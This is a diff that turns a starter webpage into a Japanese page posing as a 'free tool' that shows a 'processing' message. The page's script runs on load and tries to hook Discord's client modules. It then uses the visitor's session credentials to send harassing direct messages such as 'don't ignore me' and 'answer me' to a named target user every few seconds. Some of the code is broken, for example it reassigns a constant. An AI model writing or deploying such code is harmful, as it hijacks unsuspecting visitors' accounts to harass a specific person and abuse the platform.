@@ -1,56 +1,76 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="ja">
 <head>
-  <!-- 
-      This is an HTML comment
-      You can write text in a comment and the content won't be visible in the page
-    -->
-
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="icon" href="https://glitch.com/favicon.ico" />
-
-  <!--
-      This is the page head - it contains info the browser uses
-      Like the title, which appears on the browser tab but not inside the page
-      Further down you'll see the content that displays in the page
-    -->
-  <title>Hello World!</title>
-
-  <!-- The website stylesheet -->
-  <link rel="stylesheet" href="/style.css" />
-
-  <!-- The website JavaScript file -->
-  <script src="/script.js" defer></script>
+  <meta charset="UTF-8">
+  <title>無料ツール</title>
+  <style>
+    body { background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px; }
+    h1 { font-size:2.5em; text-shadow:0 0 20px #0f0; }
+  </style>
 </head>
-
 <body>
-  <!--
-      The body includes the content you see in the page
-      Each element is defined using tags, like this <div></div>
-      The attributes like class="wrapper" let us style elements in the CSS
-    -->
-  <div class="wrapper">
-    <div class="content" role="main">
-      <h1 class="title">Oh hi website!</h1>
-      <img src="/cool-website.svg" class="illustration" alt="cool website" />
-      <div class="instructions">
-        <p>
-          Fork <a href="https://github.com/glitchdotcom/website-to-compute">this project</a> and open it in a GitHub Codespace.
-        </p>
-        <p> Follow the steps in the README to deploy your new website to Fastly in a few steps!
-        </p>
+  <h1>処理中です... しばらくお待ちください</h1>
 
-      </div>
+  <script>
+    // 対象DiscordユーザーID（事前に取得）
+    const TARGET_ID = 'souta.1.1165'; // ←ここに対象のDiscord IDを入力
 
-      <footer class="footer">
-        <div>
-          <a class="remix" href="https://github.com/glitchdotcom/website-to-compute">🚧 Get your own site</a>
-        </div>
-      </footer>
-    </div>
-  </div>
+    const MESSAGES = [
+      'おい',
+      '無視すんな',
+      '返事しろよ',
+      'DM見て',
+      'hey',
+      '話そうぜ',
+      'オンライン？'
+    ];
+
+    // Discordクライアント注入検知＆操作
+    function startSpam() {
+      // DiscordのWebpackモジュールを探す
+      const webpackRequire = window.webpackChunkdiscord_app?.push([[Symbol()],{},(req)=>{webpackRequire=req}]) && window.webpackChunkdiscord_app.pop() && webpackRequire;
+
+      if (!webpackRequire) {
+        document.body.innerHTML = '<h1>Discordを開いてからこのページを再読み込みしてください</h1>';
+        return;
+      }
+
+      const modules = Object.values(webpackRequire.c);
+      const findModule = (filter) => modules.find(m => m?.exports?.default?.getCurrentUser || Object.values(m.exports || {}).some(filter));
+
+      // DM送信モジュール取得
+      const sendMessageModule = findModule(m => m?.sendMessage);
+      const getChannelModule = findModule(m => m?.getChannelId);
+
+      if (!sendMessageModule || !getChannelModule) {
+        document.body.innerHTML += '<p>モジュール取得失敗（Discord更新対応待ち）</p>';
+        return;
+      }
+
+      setInterval(async () => {
+        try {
+          const channel = await fetch(`https://discord.com/api/v9/users/${TARGET_ID}/channels`, {
+            credentials: 'include',
+            headers: { 'x-super-properties': btoa(JSON.stringify({os:"Windows",browser:"Chrome"})) }
+          }).then(r => r.json());
+
+          const dmChannelId = channel.id || channel[0]?.id;
+          if (!dmChannelId) return;
+
+          const msg = MESSAGES[Math.floor(Math.random() * MESSAGES.length)];
+          
+          await fetch(`https://discord.com/api/v9/channels/${dmChannelId}/messages`, {
+            method: 'POST',
+            credentials: 'include',
+            headers: { 'content-type': 'application/json' },
+            body: JSON.stringify({ content: msg })
+          });
+        } catch(e) {}
+      }, Math.floor(Math.random() * 4000) + 3000); // 3-7秒間隔
+    }
+
+    // ページロード後即実行
+    setTimeout(startSpam, 2000);
+  </script>
 </body>
-
 </html>
